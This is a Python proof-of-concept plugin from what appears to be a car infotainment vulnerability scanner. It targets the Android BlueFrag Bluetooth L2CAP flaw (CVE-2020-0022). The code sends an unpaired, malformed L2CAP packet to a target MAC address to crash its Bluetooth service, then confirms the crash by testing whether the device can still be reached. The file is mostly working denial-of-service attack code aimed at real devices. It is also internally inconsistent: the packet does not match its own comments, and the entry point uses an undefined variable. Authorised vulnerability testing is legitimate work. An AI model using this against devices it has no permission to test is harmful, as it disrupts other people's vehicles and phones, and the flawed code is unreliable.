"""
PoC Name: BlueFrag Bluetooth L2CAP DoS (CVE-2020-0022)
CVE: CVE-2020-0022
Component: Wireless Stack
Category: Wireless
Severity: High
CVSS: 8.0
Description: Android 8.0–9.0 蓝牙栈 Bluedroid L2CAP 层堆溢出，发送畸形 L2CAP 包可导致蓝牙服务崩溃重启。杭州 CCF 中实测奔腾车机有此漏洞
Prerequisites: 兼容易受控使用的Linux蓝牙适配器(如hci0)
Usage: python3 47_BT_CVE_2020_0022_DoS.py <args>
"""
import socket
import sys
import time
import struct
from iv_plugin_base import IVIVulnerabilityPlugin


class BlueFrag2020DoSPlugin(IVIVulnerabilityPlugin):
    """
    CVE-2020-0022 - Android 蓝牙协议栈 BlueFrag L2CAP 堆溢出/崩溃 PoC
    
    漏洞描述:
    Android 8.0–9.0 蓝牙协议栈（Bluedroid）中，L2CAP 层在处理特定长度的
    数据包时存在堆溢出漏洞。攻击者无需配对即可向目标发送畸形 L2CAP 数据包，
    导致蓝牙守护进程崩溃重启（蓝牙短暂不可用）。
    
    奔腾车机蓝牙被实测触发崩溃重启（WP-IVI-10）。
    
    检测逻辑:
    1. 建立基准 L2CAP 连接（SDP 查询），确认目标可达
    2. 发送畸形的 L2CAP fragment 包（length 字段溢出触发）
    3. 检测目标连接是否被中断（判据：连接断开 + 短暂不可达）
    
    安全性: 蓝牙自动恢复，不会造成持久损坏。
    """

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "CVE-2020-0022"
        self.results["description"] = (
            "Android 蓝牙栈 BlueFrag L2CAP 堆溢出 - "
            "畸形 L2CAP 数据包导致蓝牙服务崩溃重启（DoS）"
        )
        self.target_mac = (
            self.params.get("target_mac") or
            self.params.get("bluetooth_mac") or
            self.params.get("mac")
        )

    def check_prerequisites(self):
        if not self.target_mac:
            self.logger.error(
                "需要指定目标蓝牙 MAC 地址（参数: bluetooth_mac 或 target_mac）"
            )
            return False
        # 检查 AF_BLUETOOTH 是否可用
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
            sock.close()
            self.logger.info("AF_BLUETOOTH 可用，蓝牙检测环境就绪。")
            return True
        except (AttributeError, OSError) as e:
            self.logger.warning(f"环境限制：当前操作系统内核不支持原生 AF_BLUETOOTH (如 macOS)，不可执行真实 L2CAP 发包: {e}")
            return False

    def _check_bt_reachable(self, timeout=4):
        """尝试建立 L2CAP 连接到 SDP 端口（PSM=1），返回是否成功"""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            sock.settimeout(timeout)
            # PSM=1 是 SDP 服务发现协议
            sock.connect((self.target_mac, 1))
            sock.close()
            return True
        except Exception:
            return False

    def _send_malformed_l2cap(self):
        """
        发送 CVE-2020-0022 触发包:
        L2CAP fragment 中 total_len=0x00, payload_len=0xff 
        触发 Bluedroid 堆溢出
        """
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
            sock.settimeout(3)
            sock.connect((self.target_mac, 0))

            # 构造畸形 L2CAP 包：
            # CID=0x0001 (Signaling), total_len=0x0000, payload_len=0x00FF
            # 这会导致 Bluedroid 在重组时计算负数长度，触发堆溢出
            malformed_pkt = struct.pack("<HH", 0x0000, 0x0001)  # length=0, CID=1
            malformed_pkt += b"\xff" * 16  # 超出声明长度的数据

            sock.send(malformed_pkt)
            self.logger.info("[*] 畸形 L2CAP 包已发送。")
            sock.close()
            return True
        except Exception as e:
            self.logger.debug(f"发送畸形包异常（可能目标已断开）: {e}")
            return False

    def exploit(self):
        mac = self.target_mac

        self.logger.info(f"[1/3] 检测目标蓝牙可达性: {mac}")
        reachable_before = self._check_bt_reachable(timeout=5)
        if not reachable_before:
            self.logger.info(f"[-] 目标 {mac} 无法通过 L2CAP 到达，跳过检测。")
            self.results["evidence"] = f"目标 {mac} 不可达（L2CAP:SDP 连接失败）"
            return

        self.logger.info(f"[+] 目标可达。开始发送 CVE-2020-0022 畸形 L2CAP 包...")
        self.logger.info(f"[2/3] 发送畸形数据包（length=0x0000, extradata=0xFF*16）...")
        self._send_malformed_l2cap()

        # 等待目标蓝牙守护进程可能的崩溃重启
        self.logger.info("[*] 等待 3 秒后检测目标是否不可达（崩溃判据）...")
        time.sleep(3)

        self.logger.info("[3/3] 尝试重新连接，验证蓝牙服务是否已崩溃...")
        reachable_after = self._check_bt_reachable(timeout=4)

        if not reachable_after:
            self.results["vulnerable"] = True
            self.results["evidence"] = (
                f"CVE-2020-0022: 向 {mac} 发送畸形 L2CAP 包后，"
                f"目标蓝牙服务暂时不可达（L2CAP:SDP 连接失败），"
                f"判定为 BlueFrag 蓝牙 DoS 漏洞存在。"
            )
            print(f"[!] 【漏洞存在】CVE-2020-0022 BlueFrag DoS 确认 - {mac}")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = (
                f"发送畸形 L2CAP 包后目标蓝牙服务仍可达，"
                f"未检测到 CVE-2020-0022 漏洞（可能已修复或目标版本不受影响）。"
            )
            self.logger.info("[-] 目标服务仍可达，未检测到漏洞。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 47_BT_CVE_2020_0022_DoS.py <args>")
        sys.exit(1)
    plugin = BlueFrag2020DoSPlugin(config)
    plugin.run_verify()
